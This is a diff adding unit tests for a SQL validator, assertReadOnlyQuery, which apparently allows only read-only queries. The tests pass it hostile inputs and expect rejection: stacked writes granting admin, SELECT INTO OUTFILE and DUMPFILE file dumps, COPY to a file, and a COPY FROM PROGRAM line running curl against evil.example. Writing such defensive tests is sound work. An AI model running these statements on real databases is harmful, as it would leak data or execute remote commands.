@@ -32,6 +32,32 @@ test("assertReadOnlyQuery: rejects a SELECT hiding a second write statement", ()
   assert.equal(assertReadOnlyQuery("SELECT 1; UPDATE users SET role='admin'").ok, false);
 });
 
+test("assertReadOnlyQuery: rejects SELECT ... INTO new_table", () => {
+  assert.equal(assertReadOnlyQuery("SELECT * INTO new_table FROM users").ok, false);
+});
+
+test("assertReadOnlyQuery: rejects a MySQL SELECT ... INTO OUTFILE exfiltration", () => {
+  assert.equal(assertReadOnlyQuery("SELECT * FROM users INTO OUTFILE '/tmp/x'").ok, false);
+});
+
+test("assertReadOnlyQuery: rejects SELECT ... INTO DUMPFILE", () => {
+  assert.equal(assertReadOnlyQuery("SELECT contents FROM files INTO DUMPFILE '/tmp/x'").ok, false);
+});
+
+test("assertReadOnlyQuery: rejects a Postgres COPY statement", () => {
+  assert.equal(assertReadOnlyQuery("COPY users TO '/tmp/users.csv'").ok, false);
+  assert.equal(assertReadOnlyQuery("COPY users FROM PROGRAM 'curl evil.example'").ok, false);
+});
+
+test("assertReadOnlyQuery: allows a read-only WITH ... SELECT CTE", () => {
+  assert.equal(assertReadOnlyQuery("WITH t AS (SELECT 1) SELECT * FROM t").ok, true);
+});
+
+test("assertReadOnlyQuery: rejects a WITH statement that hides a write keyword", () => {
+  assert.equal(assertReadOnlyQuery("WITH t AS (SELECT 1) INSERT INTO users SELECT * FROM t").ok, false);
+  assert.equal(assertReadOnlyQuery("WITH t AS (SELECT 1) SELECT * INTO copied FROM t").ok, false);
+});
+
 test("toolOk: wraps a payload with success: true", () => {
   assert.deepEqual(JSON.parse(toolOk({ action: "list" })), { success: true, action: "list" });
 });
